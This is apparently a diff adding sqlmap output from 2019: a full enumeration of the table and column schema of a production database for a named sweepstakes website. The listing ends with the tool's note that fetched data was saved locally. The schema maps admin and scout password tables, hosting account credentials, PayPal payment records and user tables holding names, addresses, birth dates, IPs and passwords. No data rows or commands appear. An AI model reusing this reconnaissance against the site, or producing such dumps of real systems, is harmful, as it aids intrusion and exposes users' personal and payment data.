+| OfferTypeID | int(4)            |
+| status      | varchar(4)        |
++-------------+-------------------+
+
+Database: winprizesonline_production
+Table: Affiliate_Ads
+[26 columns]
++----------------+------------------+
+| Column         | Type             |
++----------------+------------------+
+| AccountID      | int(11)          |
+| AffiliateID    | int(11)          |
+| chanses        | int(11)          |
+| Clicks         | int(11)          |
+| Client         | int(11)          |
+| ConvertCounter | int(10) unsigned |
+| Description    | varchar(1000)    |
+| Earning        | float            |
+| EnteredDate    | datetime         |
+| EPC            | float            |
+| ExpDate        | date             |
+| Featured       | int(11)          |
+| href           | varchar(100)     |
+| Image          | blob             |
+| LineID         | int(11)          |
+| Paid           | float            |
+| Payout         | float            |
+| PositionType   | int(11)          |
+| Preforming     | int(11)          |
+| Prize          | varchar(100)     |
+| Prize_value    | float            |
+| RawHTML        | varchar(2000)    |
+| ReferenceID    | varchar(100)     |
+| StartDate      | date             |
+| Status         | int(11)          |
+| Title          | varchar(100)     |
++----------------+------------------+
+
+Database: winprizesonline_production
+Table: prizetune_user_webtrack
+[7 columns]
++-----------+---------+
+| Column    | Type    |
++-----------+---------+
+| date      | date    |
+| countryId | int(10) |
+| exstatus  | char(1) |
+| status    | char(1) |
+| userId    | int(10) |
+| utrackId  | int(10) |
+| webId     | int(10) |
++-----------+---------+
+
+Database: winprizesonline_production
+Table: prizetune_friends
+[4 columns]
++-----------+---------+
+| Column    | Type    |
++-----------+---------+
+| friend_id | int(10) |
+| id_user   | int(10) |
+| status1   | int(10) |
+| status2   | int(10) |
++-----------+---------+
+
+Database: winprizesonline_production
+Table: winprizes_titles_meta2
+[1 column]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| title  | varchar(200) |
++--------+--------------+
+
+Database: winprizesonline_production
+Table: affiliate_publisher_extra
+[10 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| address     | varchar(200) |
+| address2    | varchar(200) |
+| area        | varchar(200) |
+| city        | varchar(200) |
+| country     | varchar(200) |
+| paypal      | varchar(200) |
+| phone       | varchar(200) |
+| publisherid | int(10)      |
+| website     | varchar(200) |
+| zip         | varchar(200) |
++-------------+--------------+
+
+Database: winprizesonline_production
+Table: affiliate_clicks
+[11 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| date         | date         |
+| timestamp    | timestamp    |
+| id           | int(20)      |
+| ip           | varchar(200) |
+| publisherid  | int(20)      |
+| refer        | varchar(200) |
+| status       | int(1)       |
+| system       | varchar(200) |
+| type         | int(1)       |
+| UserCookieID | varchar(100) |
+| UserID       | varchar(100) |
++--------------+--------------+
+
+Database: winprizesonline_production
+Table: paypal_payment_info
+[29 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| buyer_email   | varchar(100) |
+| city          | varchar(50)  |
+| country       | varchar(20)  |
+| custom        | varchar(255) |
+| datecreation  | date         |
+| firstname     | varchar(100) |
+| itemname      | varchar(255) |
+| itemnumber    | varchar(50)  |
+| lastname      | varchar(100) |
+| mc_currency   | varchar(5)   |
+| mc_fee        | varchar(5)   |
+| mc_gross      | varchar(6)   |
+| memo          | varchar(255) |
+| on0           | varchar(50)  |
+| on1           | varchar(50)  |
+| os0           | varchar(20)  |
+| os1           | varchar(20)  |
+| paymentdate   | varchar(50)  |
+| paymentstatus | varchar(15)  |
+| paymenttype   | varchar(10)  |
+| pendingreason | varchar(10)  |
+| quantity      | char(3)      |
+| reasoncode    | varchar(20)  |
+| state         | char(3)      |
+| street        | varchar(100) |
+| tax           | varchar(10)  |
+| txnid         | varchar(30)  |
+| txntype       | varchar(100) |
+| zipcode       | varchar(11)  |
++---------------+--------------+
+
+Database: winprizesonline_production
+Table: prizetune_friend
+[8 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| acceptDate  | date         |
+| friendEmail | varchar(100) |
+| inviteDate  | date         |
+| inviteId    | int(8)       |
+| joinDate    | date         |
+| message     | text         |
+| status      | char(2)      |
+| userId      | int(8)       |
++-------------+--------------+
+
+Database: winprizesonline_production
+Table: ItemsCategories
+[3 columns]
++------------+---------+
+| Column     | Type    |
++------------+---------+
+| CategoryID | int(11) |
+| LineID     | int(11) |
+| WebID      | int(11) |
++------------+---------+
+
+Database: winprizesonline_production
+Table: prizetune_admin
+[4 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| adminId  | int(10)      |
+| password | varchar(200) |
+| status   | char(1)      |
+| username | varchar(200) |
++----------+--------------+
+
+Database: winprizesonline_production
+Table: winprizes_report
+[8 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| date     | timestamp    |
+| error    | varchar(100) |
+| id       | int(20)      |
+| status   | int(1)       |
+| text     | varchar(200) |
+| userid   | int(10)      |
+| username | varchar(200) |
+| webid    | int(10)      |
++----------+--------------+
+
+Database: winprizesonline_production
+Table: linkaprove
+[5 columns]
++------------+------------------+
+| Column     | Type             |
++------------+------------------+
+| id         | int(20) unsigned |
+| linkmethod | int(4)           |
+| status     | varchar(4)       |
+| url        | varchar(200)     |
+| WebID      | int(20)          |
++------------+------------------+
+
+Database: winprizesonline_production
+Table: prizetune_scout
+[4 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| adminId  | int(10)      |
+| password | varchar(200) |
+| status   | char(1)      |
+| username | varchar(200) |
++----------+--------------+
+
+Database: winprizesonline_production
+Table: AdsAccounts
+[7 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| AccountID     | int(11)      |
+| Description   | varchar(45)  |
+| DomainSetUpID | int(11)      |
+| HostingIP     | varchar(45)  |
+| Password      | varchar(45)  |
+| URL           | varchar(150) |
+| Username      | varchar(45)  |
++---------------+--------------+
+
+Database: winprizesonline_production
+Table: click_tracker_raw
+[7 columns]
++-------------+----------------------+
+| Column      | Type                 |
++-------------+----------------------+
+| DateStamp   | timestamp            |
+| LineID      | int(11)              |
+| urls_hash   | smallint(5) unsigned |
+| urls_key    | varchar(255)         |
+| urls_val    | text                 |
+| UserID      | int(11)              |
+| UserID_Guid | varchar(100)         |
++-------------+----------------------+
+
+Database: winprizesonline_production
+Table: prizetune_settings
+[11 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| admin_email  | varchar(100) |
+| copyright    | varchar(100) |
+| duration     | int(10)      |
+| exp_date     | varchar(200) |
+| minpoints    | int(10)      |
+| paypal_email | varchar(200) |
+| popular      | int(20)      |
+| prize_amt    | float        |
+| result       | int(8)       |
+| site_name    | varchar(100) |
+| site_url     | varchar(100) |
++--------------+--------------+
+
+Database: winprizesonline_production
+Table: AdsImages
+[6 columns]
++------------------+--------------+
+| Column           | Type         |
++------------------+--------------+
+| Affiliate_LineID | int(11)      |
+| Content          | blob         |
+| DomainID         | int(11)      |
+| FileName         | varchar(250) |
+| ImageID          | int(11)      |
+| Type             | varchar(50)  |
++------------------+--------------+
+
+Database: winprizesonline_production
+Table: click_tracker
+[14 columns]
++------------+----------------------+
+| Column     | Type                 |
++------------+----------------------+
+| urls_cnt0  | smallint(5) unsigned |
+| urls_cnt1  | smallint(5) unsigned |
+| urls_cnt2  | smallint(5) unsigned |
+| urls_cnt3  | smallint(5) unsigned |
+| urls_cnt4  | smallint(5) unsigned |
+| urls_cnt5  | smallint(5) unsigned |
+| urls_cnt6  | smallint(5) unsigned |
+| urls_cnt7  | smallint(5) unsigned |
+| urls_cnt8  | smallint(5) unsigned |
+| urls_cnt9  | smallint(5) unsigned |
+| urls_hash  | smallint(5) unsigned |
+| urls_key   | varchar(255)         |
+| urls_total | bigint(20) unsigned  |
+| urls_val   | text                 |
++------------+----------------------+
+
+Database: winprizesonline_production
+Table: prizetune_saved
+[3 columns]
++--------+---------+
+| Column | Type    |
++--------+---------+
+| LineID | int(11) |
+| userid | int(10) |
+| webid  | int(10) |
++--------+---------+
+
+Database: winprizesonline_production
+Table: tmp_prizetune_group
+[8 columns]
++-------------+-------------------+
+| Column      | Type              |
++-------------+-------------------+
+| date        | date              |
+| CatNameURL  | varchar(100)      |
+| details     | varchar(600)      |
+| groupId     | int(100) unsigned |
+| H1Title     | varchar(200)      |
+| name        | varchar(200)      |
+| OfferTypeID | int(4)            |
+| status      | varchar(4)        |
++-------------+-------------------+
+
+Database: winprizesonline_production
+Table: prizetune_bonus
+[17 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| dec        | int(10)      |
+| apr        | int(10)      |
+| aug        | int(10)      |
+| bonusId    | int(8)       |
+| feb        | int(10)      |
+| jan        | int(10)      |
+| jul        | int(10)      |
+| jun        | int(10)      |
+| mar        | int(10)      |
+| may        | int(10)      |
+| nov        | int(10)      |
+| oct        | int(10)      |
+| sep        | int(10)      |
+| status     | char(2)      |
+| totalPoint | int(10)      |
+| userId     | int(8)       |
+| username   | varchar(200) |
++------------+--------------+
+
+Database: winprizesonline_production
+Table: prizetune_category
+[5 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| date       | date         |
+| categoryId | int(100)     |
+| details    | varchar(200) |
+| name       | varchar(200) |
+| status     | varchar(4)   |
++------------+--------------+
+
+Database: winprizesonline_production
+Table: create_sweeps_entries
+[15 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| date        | timestamp    |
+| first       | varchar(200) |
+| last        | varchar(200) |
+| address     | varchar(200) |
+| area        | varchar(200) |
+| city        | varchar(200) |
+| country     | varchar(200) |
+| email       | varchar(200) |
+| id          | int(10)      |
+| ip          | varchar(200) |
+| newsletter  | varchar(20)  |
+| phone       | varchar(200) |
+| publisherid | int(10)      |
+| sweepid     | int(10)      |
+| zip         | varchar(200) |
++-------------+--------------+
+
+Database: winprizesonline_production
+Table: tmp_prizetune_website
+[34 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| Date        | date         |
+| domain      | varchar(300) |
+| Active      | varchar(10)  |
+| Area        | varchar(100) |
+| blog        | int(1)       |
+| ca          | int(1)       |
+| categoryId  | int(10)      |
+| chances     | int(3)       |
+| Country     | int(10)      |
+| Eligible    | varchar(100) |
+| endDate     | date         |
+| enter       | int(100)     |
+| Entry       | varchar(200) |
+| Expire      | date         |
+| exstatus    | char(1)      |
+| Featured    | varchar(10)  |
+| form_id     | int(10)      |
+| image       | varchar(200) |
+| image_thumb | varchar(200) |
+| instant     | int(1)       |
+| ip          | varchar(200) |
+| Prize       | varchar(300) |
+| Prize_value | int(20)      |
+| prizecat    | varchar(200) |
+| publisherid | int(10)      |
+| Sponsor     | varchar(20)  |
+| Status      | varchar(10)  |
+| Title       | varchar(38)  |
+| type_form   | int(2)       |
+| URL         | varchar(300) |
+| URLR        | varchar(300) |
+| us          | int(1)       |
+| userId      | int(8)       |
+| webId       | int(10)      |
++-------------+--------------+
+
+Database: winprizesonline_production
+Table: winprizes_group_types
+[2 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| id     | int(3)       |
+| type   | varchar(100) |
++--------+--------------+
+
+Database: winprizesonline_production
+Table: powersweeper_criteria
+[4 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| Selected  | int(11)     |
+| TableName | varchar(50) |
+| UserID    | int(11)     |
+| ValueID   | int(11)     |
++-----------+-------------+
+
+Database: winprizesonline_production
+Table: winprizes_titles_meta
+[1 column]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| title  | varchar(200) |
++--------+--------------+
+
+Database: winprizesonline_production
+Table: prizetune_cronicallink
+[4 columns]
++---------+---------------+
+| Column  | Type          |
++---------+---------------+
+| Where   | varchar(100)  |
+| href    | varchar(1000) |
+| Name    | varchar(50)   |
+| OrderBy | varchar(100)  |
++---------+---------------+
+
+Database: winprizesonline_production
+Table: winprizes_random
+[4 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| date    | date         |
+| id      | int(10)      |
+| prizeid | int(10)      |
+| typeid  | varchar(200) |
++---------+--------------+
+
+Database: winprizesonline_production
+Table: winprizes_votes
+[5 columns]
++---------+---------+
+| Column  | Type    |
++---------+---------+
+| date    | date    |
+| id      | int(20) |
+| prizeid | int(20) |
+| userid  | int(20) |
+| vote    | int(10) |
++---------+---------+
+
+Database: winprizesonline_production
+Table: prizetune_user
+[35 columns]
++---------------+---------------------------------------+
+| Column        | Type                                  |
++---------------+---------------------------------------+
+| first         | varchar(200)                          |
+| last          | varchar(200)                          |
+| aboutme       | varchar(1000)                         |
+| aboutme_date  | date                                  |
+| address       | varchar(200)                          |
+| address2      | varchar(200)                          |
+| approved      | int(4)                                |
+| area          | varchar(200)                          |
+| city          | varchar(200)                          |
+| country       | varchar(200)                          |
+| dob           | varchar(100)                          |
+| email         | varchar(200)                          |
+| emailfraq     | int(4)                                |
+| fb_id         | bigint(11)                            |
+| flag          | enum(\\u0027Y\\u0027,\\u0027N\\u0027) |
+| image         | varchar(244)                          |
+| IP            | varchar(100)                          |
+| join_date     | varchar(100)                          |
+| loginDate     | date                                  |
+| loginStatus   | char(1)                               |
+| no_of_entries | int(100)                              |
+| no_of_friends | int(100)                              |
+| no_of_invited | int(100)                              |
+| password      | varchar(200)                          |
+| phone         | varchar(200)                          |
+| prize_value   | int(100)                              |
+| referId       | int(10)                               |
+| sex           | varchar(100)                          |
+| start_date    | datetime                              |
+| status        | char(1)                               |
+| toolbar       | int(11)                               |
+| type          | varchar(200)                          |
+| userId        | int(20)                               |
+| username      | varchar(200)                          |
+| zip           | varchar(200)                          |
++---------------+---------------------------------------+
+
+Database: winprizesonline_production
+Table: winprizes_featured_ads_webid
+[3 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| categories | varchar(100) |
+| data       | date         |
+| webid      | int(10)      |
++------------+--------------+
+
+Database: winprizesonline_production
+Table: prizetune_event
+[13 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| categoryId  | varchar(100) |
+| clickDate   | date         |
+| clicks      | int(10)      |
+| endDate     | date         |
+| eventId     | int(10)      |
+| favourites  | char(1)      |
+| mdate       | date         |
+| Prize_value | int(20)      |
+| Sponsor     | varchar(100) |
+| status      | char(1)      |
+| Title       | varchar(100) |
+| userId      | int(10)      |
+| webId       | int(10)      |
++-------------+--------------+
+
+Database: winprizesonline_production
+Table: wpo_registration_requests
+[21 columns]
++-----------------+--------------+
+| Column          | Type         |
++-----------------+--------------+
+| activation_date | datetime     |
+| City            | varchar(50)  |
+| Country         | varchar(25)  |
+| DOB             | date         |
+| email           | varchar(200) |
+| expiration      | datetime     |
+| firstname       | varchar(25)  |
+| gender          | varchar(5)   |
+| ipaddress       | varchar(15)  |
+| lastname        | varchar(25)  |
+| newsletter      | tinyint(4)   |
+| Password        | varchar(200) |
+| request_date    | datetime     |
+| request_status  | varchar(10)  |
+| requestid       | int(11)      |
+| selector        | varchar(64)  |
+| State           | varchar(25)  |
+| token           | varchar(64)  |
+| userid          | int(20)      |
+| username        | varchar(200) |
+| zipcode         | varchar(25)  |
++-----------------+--------------+
+
+Database: winprizesonline_production
+Table: prizetune_prize
+[6 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| date         | varchar(244) |
+| bonusprizeId | int(10)      |
+| draw_date    | varchar(244) |
+| grand_prize  | varchar(244) |
+| prize        | varchar(244) |
+| status       | char(1)      |
++--------------+--------------+
+
+Database: winprizesonline_production
+Table: prizetune_website_field_list
+[3 columns]
++--------------+-------------+
+| Column       | Type        |
++--------------+-------------+
+| field_name   | varchar(30) |
+| field_rel_db | varchar(60) |
+| id           | int(10)     |
++--------------+-------------+
+
+Database: winprizesonline_production
+Table: prizetune_detail
+[3 columns]
++---------------+---------------+
+| Column        | Type          |
++---------------+---------------+
+| prize_content | varchar(2000) |
+| prizeId       | int(11)       |
+| webId         | int(11)       |
++---------------+---------------+
+
+Database: winprizesonline_production
+Table: winprizes_ads
+[6 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| id     | int(20)      |
+| image  | varchar(200) |
+| status | varchar(1)   |
+| title  | varchar(400) |
+| type   | varchar(200) |
+| url    | varchar(400) |
++--------+--------------+
+
+Database: winprizesonline_production
+Table: _optout
+[5 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| Date    | varchar(255) |
+| Email   | varchar(255) |
+| MovedBy | varchar(255) |
+| Reason  | varchar(255) |
+| Type    | varchar(255) |
++---------+--------------+
+
+Database: winprizesonline_production
+Table: prizetune_image
+[3 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| image_name | varchar(200) |
+| imageId    | int(20)      |
+| status     | char(1)      |
++------------+--------------+
+
+Database: winprizesonline_production
+Table: prizetune_mostpopular
+[9 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| Count       | int(10)      |
+| CleanTitle  | varchar(100) |
+| Duration    | varchar(45)  |
+| id          | int(10)      |
+| image       | varchar(200) |
+| OfferTypeID | int(4)       |
+| Prize       | varchar(500) |
+| Title       | varchar(200) |
+| webid       | int(10)      |
++-------------+--------------+
+
+Database: winprizesonline_production
+Table: Ads_Box
+[22 columns]
++--------------+---------------+
+| Column       | Type          |
++--------------+---------------+
+| Affiliate    | varchar(250)  |
+| AffiliateID  | int(11)       |
+| Content      | longtext      |
+| Description  | varchar(1000) |
+| DomainID     | int(11)       |
+| ExternalWDSL | varchar(1000) |
+| height       | int(11)       |
+| href         | varchar(1000) |
+| IsExternal   | int(11)       |
+| Keyword      | varchar(1000) |
+| LiveStatus   | int(11)       |
+| Ordinal      | int(11)       |
+| PageID       | int(11)       |
+| PageName     | varchar(100)  |
+| Price        | float         |
+| Rotation     | int(11)       |
+| SubPageID    | int(11)       |
+| SubTitle     | varchar(1000) |
+| Title        | varchar(1000) |
+| TitleH1      | varchar(1000) |
+| TitleTag     | varchar(1000) |
+| width        | int(11)       |
++--------------+---------------+
+
+[10:37:08] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.winprizesonline.com'
+
+[*] ending @ 10:37:08 /2019-09-24/
+
